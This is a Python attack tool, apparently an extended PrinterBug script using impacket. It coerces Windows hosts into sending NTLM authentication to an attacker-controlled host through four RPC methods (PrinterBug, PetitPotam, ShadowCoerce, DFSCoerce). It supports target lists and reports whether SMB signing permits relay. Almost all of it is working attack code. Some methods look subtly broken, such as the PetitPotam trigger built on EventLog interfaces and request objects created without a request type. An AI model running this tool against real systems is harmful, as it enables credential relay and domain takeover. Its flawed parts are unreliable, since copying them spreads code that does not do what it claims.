#!/usr/bin/env python3
####################
#
# PrinterBug Pro - Multi-method NTLM Coercer
# Original PrinterBug Copyright (c) 2019 Dirk-jan Mollema (@_dirkjan)
# Additional methods added, 100% backward compatible
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Supported coercion methods:
#  - MS-RPRN (PrinterBug, default)
#  - MS-EFSR (PetitPotam)
#  - MS-FSRVP (ShadowCoerce)
#  - MS-DFSNM (DFSCoerce)
#
####################
import sys
import logging
import argparse
import codecs
import socket
import re
from impacket.examples.logger import ImpacketFormatter
from impacket import version
from impacket.dcerpc.v5 import transport, rprn, epm, even6
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
# Simple restrained colors, only for errors/warnings
class Colors:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
# Fix for new impacket logger requiring identity field
class IdentityFilter(logging.Filter):
    def filter(self, record):
        if not hasattr(record, 'identity'):
            record.identity = ''
        return True
def log_info(msg):
    print(f"[*] {msg}")
def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")
def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_verbose(msg):
    if logging.getLogger().level == logging.DEBUG:
        print(f"[D] {msg}")
class MultiCoercer:
    # Method definitions
    METHODS = {
        'printerbug': {
            'uuid': rprn.MSRPC_UUID_RPRN,
            'pipe': r'\pipe\spoolss',
            'short_name': 'rprn',
            'name': 'MS-RPRN (PrinterBug)'
        },
        'petitpotam': {
            'uuid': even6.MSRPC_UUID_EVEN6,
            'pipe': r'\pipe\efsrpc',
            'short_name': 'efsr',
            'name': 'MS-EFSR (PetitPotam)'
        },
        'shadowcoerce': {
            'uuid': ('a8e0653c-2744-4389-a61d-7373df8b2292', '1.0'),
            'pipe': r'\pipe\FssagentRpc',
            'short_name': 'fsrvp',
            'name': 'MS-FSRVP (ShadowCoerce)'
        },
        'dfscoerce': {
            'uuid': ('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0'),
            'pipe': r'\pipe\netdfs',
            'short_name': 'dfsn',
            'name': 'MS-DFSNM (DFSCoerce)'
        }
    }
    def __init__(self, username='', password='', domain='', port=445,
                 hashes=None, attackerhost='', ping=True, timeout=3,
                 doKerberos=False, dcHost='', targetIp=None, method='printerbug'):
        self.__username = username
        self.__password = password
        self.__port = port
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__attackerhost = attackerhost
        self.__tcp_ping = ping
        self.__tcp_timeout = timeout
        self.__doKerberos = doKerberos
        self.__dcHost = dcHost
        self.__targetIp = targetIp
        self.__method = method
        self.__is_anon = (username == '' or username.lower() == 'guest')
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
    def tcp_ping(self, host):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.__tcp_timeout)
            s.connect((host, self.__port))
            s.close()
            return True
        except KeyboardInterrupt:
            raise
        except:
            return False
    def check_smb_signing(self, rpctransport):
        """Check if target has SMB signing enforced"""
        try:
            smb_conn = rpctransport.get_smb_connection()
            if smb_conn and hasattr(smb_conn, 'isSigningRequired'):
                return smb_conn.isSigningRequired()
        except:
            pass
        return None
    def trigger_printerbug(self, dce, host):
        """MS-RPRN trigger"""
        try:
            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
        except DCERPCException as e:
            err_str = str(e)
            if 'ACCESS_DENIED' in err_str.upper():
                return 'access_denied', err_str
            return 'connect_fail', err_str
        log_info("Got handle")
        request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request['hPrinter'] = resp['pHandle']
        request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
        request['pszLocalMachine'] = '\\\\%s\x00' % self.__attackerhost
        request['pOptions'] = NULL
        try:
            dce.request(request)
            return 'triggered', None
        except DCERPCException as e:
            # Packet sent, auth likely triggered even on error
            return 'triggered', str(e)
    def trigger_petitpotam(self, dce, host):
        """MS-EFSR PetitPotam trigger"""
        try:
            request = even6.EfsRpcOpenFileRaw()
            request['BindingHandle'] = NULL
            request['FileName'] = '\\\\%s\\test\x00' % self.__attackerhost
            request['Flags'] = 0
            dce.request(request)
            return 'triggered', None
        except DCERPCException as e:
            err_str = str(e)
            if 'ACCESS_DENIED' in err_str.upper():
                return 'access_denied', err_str
            # Packet sent, auth likely triggered
            return 'triggered', err_str
    def trigger_shadowcoerce(self, dce, host):
        """MS-FSRVP ShadowCoerce trigger"""
        try:
            request = dce.request()
            request['opnum'] = 1
            request['pwszShareName'] = '\\\\%s\\test\x00' % self.__attackerhost
            request['ppIsSupported'] = NULL
            dce.request(request)
            return 'triggered', None
        except DCERPCException as e:
            err_str = str(e)
            if 'ACCESS_DENIED' in err_str.upper():
                return 'access_denied', err_str
            if 'NOT_SUPPORTED' in err_str.upper():
                return 'not_supported', err_str
            return 'triggered', err_str
    def trigger_dfscoerce(self, dce, host):
        """MS-DFSNM DFSCoerce trigger"""
        try:
            request = dce.request()
            request['opnum'] = 1
            request['ServerName'] = '\\\\%s\x00' % host
            request['RootShare'] = 'test\x00'
            request['RootComment'] = '\x00'
            request['ApiFlags'] = 0
            dce.request(request)
            return 'triggered', None
        except DCERPCException as e:
            err_str = str(e)
            if 'ACCESS_DENIED' in err_str.upper():
                return 'access_denied', err_str
            return 'triggered', err_str
    def coerce_host(self, remote_host, method=None):
        """Coerce single host, accurate practical output"""
        if method is None:
            method = self.__method
        if method == 'all':
            methods_to_try = list(self.METHODS.keys())
        else:
            methods_to_try = [method]
        if self.__tcp_ping and not self.tcp_ping(remote_host):
            log_warning(f"{remote_host}:{self.__port} unreachable, skipping")
            return False
        for method_name in methods_to_try:
            method_info = self.METHODS[method_name]
            log_info(f"Attempting trigger via {method_info['short_name']} RPC at {remote_host}")
            try:
                bind_str = f'ncacn_np:{remote_host}[{method_info["pipe"]}]'
                rpctransport = transport.DCERPCTransportFactory(bind_str)
                rpctransport.set_dport(self.__port)
                rpctransport.setRemoteHost(self.__targetIp if self.__targetIp else remote_host)
                if hasattr(rpctransport, 'set_credentials'):
                    rpctransport.set_credentials(self.__username, self.__password, self.__domain, 
                                                self.__lmhash, self.__nthash)
                if self.__doKerberos:
                    rpctransport.set_kerberos(True, kdcHost=self.__dcHost)
                # Check SMB signing on first connection
                if method_name == methods_to_try[0]:
                    signing_required = self.check_smb_signing(rpctransport)
                    if signing_required is True:
                        log_warning(f"SMB signing ENFORCED - NTLM relay will NOT work")
                    elif signing_required is False:
                        log_info(f"SMB signing not enforced - relay is possible")
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(method_info['uuid'])
                log_info("Bind OK")
                # Run trigger
                if method_name == 'printerbug':
                    status, err = self.trigger_printerbug(dce, remote_host)
                elif method_name == 'petitpotam':
                    status, err = self.trigger_petitpotam(dce, remote_host)
                elif method_name == 'shadowcoerce':
                    status, err = self.trigger_shadowcoerce(dce, remote_host)
                elif method_name == 'dfscoerce':
                    status, err = self.trigger_dfscoerce(dce, remote_host)
                else:
                    status, err = 'fail', 'Unknown method'
                dce.disconnect()
                # Handle different statuses accurately
                if status == 'triggered':
                    if err:
                        print(err)
                    log_info(f"Triggered backconnect to {self.__attackerhost} via {method_info['short_name']}, check your listener")
                    return True
                elif status == 'access_denied':
                    print(err)
                    if self.__is_anon:
                        log_warning("Access denied with anonymous/guest, try valid domain credentials")
                    else:
                        log_warning("Access denied, current credentials lack required permissions")
                    if len(methods_to_try) == 1:
                        return False
                    continue
                elif status == 'not_supported':
                    print(err)
                    log_warning(f"{method_info['short_name']} method not supported on target")
                    if len(methods_to_try) == 1:
                        return False
                    continue
                else: # connect_fail / other
                    if err:
                        print(err)
                    continue
            except Exception as e:
                err_str = str(e)
                if 'timed out' in err_str.lower() or 'connection refused' in err_str.lower():
                    log_warning(f"Connection failed: {err_str}")
                elif 'ACCESS_DENIED' in err_str.upper():
                    print(err_str)
                    if self.__is_anon:
                        log_warning("Access denied with anonymous/guest, try valid domain credentials")
                    else:
                        log_warning("Access denied, current credentials lack required permissions")
                else:
                    log_verbose(f"{method_info['short_name']} failed: {err_str}")
                continue
        log_error(f"{remote_host}: All methods failed")
        return False
def main():
    # Init impacket logger
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(ImpacketFormatter())
    handler.addFilter(IdentityFilter())
    logging.getLogger().addHandler(handler)
    logging.getLogger().setLevel(logging.INFO)
    # Fix stdout encoding
    if sys.stdout.encoding is None:
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
    # 100% original-compatible arguments
    parser = argparse.ArgumentParser(description="Windows NTLM authentication coercer")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('attackerhost', action='store', help='Attacker host IP/hostname to receive authentication')
    parser.add_argument("--verbose", action="store_true", help="Verbose debug output")
    parser.add_argument("--method", choices=['printerbug', 'petitpotam', 'shadowcoerce', 'dfscoerce', 'all'], 
                        default='printerbug', help="Coercion method (default: printerbug, 'all' to try all)")
    group = parser.add_argument_group('connection')
    group.add_argument('-target-file', action='store', metavar="file",
                       help='File with target list (one per line)')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='SMB port (default: 445)')
    group.add_argument("-timeout", action="store", metavar="timeout", default=3, type=float,
                       help="Connection timeout in seconds (default: 3)")
    group.add_argument("-no-ping", action="store_true",
                       help="Skip pre-connection TCP ping")
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help="Don't ask for password (anonymous/relay)")
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication')
    group.add_argument('-dc-ip', action="store", metavar="ip address",
                       help='Domain controller IP')
    group.add_argument('-target-ip', action="store", metavar="ip address",
                       help='Target IP when using hostname')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    # Parse credentials
    domain, username, password, remote_name = re.compile(
        r'(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)'
    ).match(options.target).groups('')
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]
    if domain is None:
        domain = ''
    dc_ip = options.dc_ip if options.dc_ip else domain
    # Get password if needed
    if password == '' and username != '' and options.hashes is None and not options.no_pass:
        from getpass import getpass
        password = getpass("Password: ")
    # Load targets
    targets = []
    if options.target_file:
        with open(options.target_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        log_info(f"Loaded {len(targets)} targets from file")
    else:
        targets.append(remote_name)
    # Run coercion
    coercer = MultiCoercer(
        username=username,
        password=password,
        domain=domain,
        port=int(options.port),
        hashes=options.hashes,
        attackerhost=options.attackerhost,
        ping=not options.no_ping,
        timeout=options.timeout,
        doKerberos=options.k,
        dcHost=dc_ip,
        targetIp=options.target_ip,
        method=options.method
    )
    success_count = 0
    for idx, target in enumerate(targets, 1):
        if len(targets) > 1:
            print(f"\n[{idx}/{len(targets)}] Target: {target}")
        try:
            if coercer.coerce_host(target):
                success_count += 1
        except KeyboardInterrupt:
            log_warning("Interrupted by user")
            break
    if len(targets) > 1:
        print(f"\n[*] Done. Triggered {success_count}/{len(targets)} targets")
if __name__ == '__main__':
    main()